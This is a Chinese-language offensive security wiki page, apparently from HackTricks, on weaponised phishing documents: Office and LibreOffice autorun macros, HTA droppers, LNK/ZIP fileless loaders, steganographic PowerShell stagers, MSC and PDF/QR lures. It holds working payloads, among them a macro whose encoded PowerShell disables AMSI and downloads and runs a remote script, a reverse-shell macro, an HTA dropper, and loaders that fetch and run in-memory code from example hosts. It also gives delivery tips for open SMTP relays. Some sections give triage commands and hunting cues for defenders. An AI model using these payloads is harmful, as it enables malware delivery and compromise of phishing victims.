# Phishing 文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 会在打开文件前验证文件数据。数据验证通过根据 OfficeOpenXML 标准识别数据结构来完成。如果在识别数据结构时发生任何错误，正在分析的文件将不会被打开。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。不过，也可以通过更改文件扩展名来重命名文件，同时保留其执行宏的能力。\
例如，RTF 文件在设计上不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并允许执行宏。\
相同的内部机制适用于 Microsoft Office 套件中的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查某些 Office 程序将执行哪些扩展名：

```bash
assoc | findstr /i "word excel powerp"
```

引用远程模板（File –Options –Add-ins –Manage: Templates –Go）的 DOCX 文件如果包含宏，也可以“执行”宏。

### 外部图像加载

前往：_Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 外部图像加载：前往：Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### 宏后门

可以使用宏从文档中运行任意代码。

#### 自动加载函数

这类函数越常见，AV 就越有可能检测到它们。

- AutoOpen()
- Document_Open()

#### 宏代码示例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 手动移除元数据

转到 **File > Info > Inspect Document > Inspect Document**，打开 Document Inspector。点击 **Inspect**，然后点击 **Document Properties and Personal Information** 旁边的 **Remove All**。

#### Doc 扩展名

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 Word 97-2003 **`.doc`**。\
这样做是因为**无法在 `.docx` 中保存宏**，而启用宏的 **`.docm`** 扩展名**带有污名**（例如，缩略图图标上有一个很大的 `!`，而且某些 Web/电子邮件网关会完全拦截它们）。因此，这个**旧版 `.doc` 扩展名是最佳折中方案**。

#### 恶意宏生成器

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 自动运行宏 (Basic)

LibreOffice Writer 文档可以嵌入 Basic 宏，并通过将宏绑定到 **Open Document** 事件（Tools → Customize → Events → Open Document → Macro…），在文件打开时自动执行。<sup>[[1]](#references)</sup> 一个简单的 reverse shell 宏如下：

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

注意字符串中的双引号（`""`）——LibreOffice Basic 使用它们转义字面引号，因此以 `...==""")` 结尾的 payloads 可确保内部命令和 Shell 参数的引号都正确配对。

交付提示：

- 保存为 `.odt`，并将宏绑定到文档事件，使其在打开时立即触发。
- 使用 `swaks` 发送邮件时，使用 `--attach @resume.odt`（必须带 `@`，这样发送的才是文件字节，而不是文件名字符串）。当滥用允许任意 `RCPT TO` 收件人且不进行验证的 SMTP 服务器时，这一点至关重要。

## HTA Files

HTA 是一种 Windows 程序，**结合了 HTML 和脚本语言（例如 VBScript 和 JScript）**。它会生成用户界面，并作为“完全受信任”的应用程序运行，不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行，该程序通常会随 **Internet Explorer** 一同**安装**，因此 **`mshta` 依赖 IE**。如果 IE 已被卸载，HTA 将无法执行。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## 强制 NTLM 认证

有几种方法可以**远程强制 NTLM 认证**，例如，可以在邮件或用户会访问的 HTML 中添加**不可见图像**（甚至通过 HTTP MitM？）。也可以向受害者发送**文件地址**，让其只需**打开文件夹**就会**触发**一次**认证**。

**在以下页面中查看这些方法及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或认证信息，还可以**执行 NTLM relay 攻击**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP 内嵌载荷（无文件攻击链）

效果显著的攻击活动会投递一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。诀窍在于，实际的 PowerShell loader 存储在 ZIP 原始字节中、一个唯一标记之后，而 .lnk 会从中提取并完全在内存中运行它。<sup>[[2]](#references)</sup>

.lnk 实现的 PowerShell 单行命令通常按以下流程执行：

1) 在常见路径中查找原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData%，以及当前工作目录的父目录。
2) 读取 ZIP 字节并查找硬编码标记（例如 xFIQCV）。标记之后的所有内容都是内嵌的 PowerShell 载荷。
3) 将 ZIP 复制到 %ProgramData%，在该处解压，然后打开诱饵 .docx，使其看起来合法。
4) 绕过当前进程的 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 对下一阶段进行反混淆（例如，移除所有 # 字符），并在内存中执行。

用于提取并运行内嵌阶段的 PowerShell 示例框架：

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

备注
- 投递通常会滥用信誉良好的 PaaS 子域名（例如 *.herokuapp.com），并可能对 payload 设置门槛（根据 IP/UA 提供无害 ZIP 文件）。
- 下一阶段通常会解密 base64/XOR shellcode，并通过 Reflection.Emit + VirtualAlloc 执行，以尽量减少磁盘痕迹。

同一攻击链中使用的持久化
- 劫持 Microsoft Web Browser 控件的 COM TypeLib，使 IE/Explorer 或任何嵌入该控件的应用自动重新启动 payload。<sup>[[2]](#references)[[4]](#references)</sup> 此处提供详细说明和可直接使用的命令：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

狩猎/IOCs
- ZIP 文件的归档数据末尾附加了 ASCII 标记字符串（例如 xFIQCV）。
- .lnk 会枚举父级/用户文件夹以定位 ZIP，并打开诱饵文档。
- 通过 [System.Management.Automation.AmsiUtils]::amsiInitFailed 篡改 AMSI。
- 持续时间较长的业务邮件线程，最后附有托管在可信 PaaS 域名下的链接。

## 先打开诱饵的 LNK staging → scheduled-task persistence → 可信 CPL side-loading

另一种反复出现的模式是**伪装成文档的 `.lnk`**，它会立即打开无害诱饵，同时在后台准备真正的攻击链。<sup>[[3]](#references)</sup>

观察到的工作流程：
1. 快捷方式**伪装成 PDF**，并使用 `conhost.exe` 或类似代理来启动经过混淆的 PowerShell downloader。
2. PowerShell 将明显的 token 拆分（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`），使搜索 `iwr`、`gci`、`ren`、`cpi` 或 `schtasks` 的简单检测无法发现该命令。
3. stager 会**先下载诱饵文档**并为受害者打开，然后在后台重构恶意文件。
4. Payload 可能会以**无关扩展名**写入，然后通过剥除填充字符来重命名，从而延迟明显的 `.exe` / `.cpl` 文件出现。
5. 通过**按分钟运行的 scheduled task**建立持久化，该任务会从用户可写路径启动可信主机二进制文件。

此模式的基本狩猎线索：

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

可识别的一种实用暂存布局如下：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 或 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 的案例研究中，计划任务反复从 `C:\Users\Public\` 启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被放在它旁边，且导出了 **`RunFODW`**，这个受信任的 Microsoft 二进制文件便侧加载了攻击者的 CPL，而不是合法的系统副本。

随后，CPL 会：
- 从 `C:\Windows\Tasks\editor.dat` 读取 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 对其解密
- 分配可执行内存并复制解密后的 shellcode
- 将 shellcode 指针作为 **`EnumUILanguagesW`** 的回调函数，以间接方式执行

最后这一点值得单独进行排查：恶意软件通常会避免直接跳转 `((void(*)())buf)()`，转而滥用**接受回调函数的合法 WinAPI**来转移执行流。

此攻击活动中解密出的载荷是 **Donut** shellcode，随后它会将最终 PE 完全映射到内存中，并在当前进程中修补 **AMSI/WLDP/ETW**，再交出执行权。有关侧加载和驻留内存的后处理的更多说明，请参阅：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的排查切入点：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后出现可见的诱饵文档。
- 文件短暂下载到 **`C:\Users\Public\`**，随后立即从无意义的扩展名重命名。
- 名称平淡的计划任务（例如 `GoogleErrorReport`）从**用户可写目录**执行。
- 受信任的二进制文件从同一非系统目录加载 **`.cpl` / `.dll`** 文件。
- Base64 文本 blob 写入 **`C:\Windows\Tasks\`**，随后由侧加载的模块读取。

## 图像中的隐写分隔载荷（PowerShell stager）

近期的 loader 链会投递经过混淆的 JavaScript/VBS，用于解码并运行 Base64 PowerShell stager。该 stager 会下载一张图像（通常是 GIF），其中以纯文本形式隐藏着一个 Base64 编码的 .NET DLL，并由唯一的起止标记括起来。脚本会搜索这些分隔符（在实际攻击中见过的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取标记之间的文本，将其 Base64 解码为字节，在内存中加载程序集，并使用 C2 URL 调用已知的入口方法。<sup>[[5]](#references)</sup>

工作流程
- 阶段 1：归档的 JS/VBS dropper → 解码内嵌的 Base64 → 使用 -nop -w hidden -ep bypass 启动 PowerShell stager。
- 阶段 2：PowerShell stager → 下载图像，提取由标记分隔的 Base64，在内存中加载 .NET DLL，并调用其方法（例如 VAI），传入 C2 URL 和选项。
- 阶段 3：Loader 获取最终载荷，通常通过进程空洞化将其注入受信任的二进制文件（常见的是 MSBuild.exe）。<sup>[[7]](#references)[[8]](#references)</sup> 有关进程空洞化和利用受信任实用程序进行代理执行的更多内容，请参阅：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

用于从图像中提取 DLL 并在内存中调用 .NET 方法的 PowerShell 示例：

<details>
<summary>PowerShell 隐写载荷提取器和加载器</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

备注
- 这是 ATT&CK T1027.003（steganography/marker-hiding）。<sup>[[6]](#references)</sup> 不同 campaign 使用的标记各不相同。
- 在加载 assembly 前，通常会先执行 AMSI/ETW bypass 和字符串反混淆。
- 搜寻线索：扫描已下载的图像，查找已知分隔符；识别访问图像并立即解码 Base64 blob 的 PowerShell。

另请参阅 stego 工具和 carving 技术：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

常见的初始阶段是一个体积小、经过高度混淆的 `.js` 或 `.vbs` 文件，随压缩包一起投递。它的唯一目的，是解码内嵌的 Base64 字符串，并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导下一阶段。<sup>[[5]](#references)</sup>

逻辑框架（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 blob
- 解码为 ASCII PowerShell
- 通过 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

搜寻线索
- 压缩包中的 JS/VBS 附件启动 `powershell.exe`，命令行中包含 `-enc`/`FromBase64String`。
- `wscript.exe` 从用户临时目录启动 `powershell.exe -nop -w hidden`。

## 将 MSC 文档用作执行容器（GrimResource）

Microsoft Management Console 文件（`.msc`）是通常由 `mmc.exe` 打开的 XML 控制台定义文件。**GrimResource** 利用 `StringTable` 对一个包含旧式 XSS primitive 的 `apds.dll` 资源的引用，使用户打开特制控制台时，JavaScript 能在 `mmc.exe` 内运行。已观察到的样本结合使用基于 `transformNode` 的混淆和 **DotNetToJScript**，无需采用常见的 Office 宏路径即可实例化 .NET payload。<sup>[[9]](#references)</sup>

进行静态初步检查时，应将不可信的 MSC 文件视为文本，且**不要**双击它：<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高信号运行时转折点包括 `mmc.exe` 加载 CLR 或脚本组件、创建网络连接，或启动 `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe` 或意料之外的可执行文件。该格式本身是合法的，因此检测应关联**来源 + 可疑 XML/脚本内容 + `mmc.exe` 行为**，而不是阻止所有 MSC。<sup>[[9]](#references)</sup>

## PDF/QR 重定向器与载荷门控

PDF 不需要利用漏洞也能发挥作用。近期攻击活动会在看似无害的文档中放置**QR code 或普通链接**，使浏览器会话绕过邮件安全控制，并根据收件人地址定制目标页面。Microsoft 记录了 2025 年的 PDF 攻击活动，其中 QR URL 对每位收件人都是唯一的，并指向 RaccoonO365 凭据窃取基础设施；另一条类似攻击链使用 IP/环境门控，向选定访客返回 JavaScript/MSI 路径，而向扫描器或不允许的客户端返回无害 PDF。<sup>[[10]](#references)</sup>

对 PDF 操作和渲染后的 QR code 都进行初步分析。QR code 可能是矢量绘制的，而非以可提取图像的形式存储，因此应将每一页栅格化，并提取嵌入的图像：

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

检查隔离分析系统解码出的目标地址和重定向，无需进行身份验证。值得关注的特征包括：正文几乎为空、仅含 QR code 的 PDF；嵌在查询参数中的收件人邮箱；经过多个信誉良好的托管服务的重定向；以及根据 IP、地理位置、cookie、referrer 或 user agent 返回不同内容。使用受控配置文件比较请求，因为单次 sandbox 抓取可能只会收到诱饵内容。<sup>[[10]](#references)</sup>

## 用于窃取 NTLM hashes 的 Windows 文件

查看有关**窃取 NTLM 凭据的位置**的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：针对美国公司的复杂 phishing 攻击](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：追踪 Dropping Elephant 通过以中国为主题的 loader 链实施的 tradecraft](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新的 COM persistence 技术 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader 投递多种 infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：利用 Microsoft Management Console 进行初始访问和规避](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 威胁行为者利用报税季开展以税务为主题的 phishing 活动](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
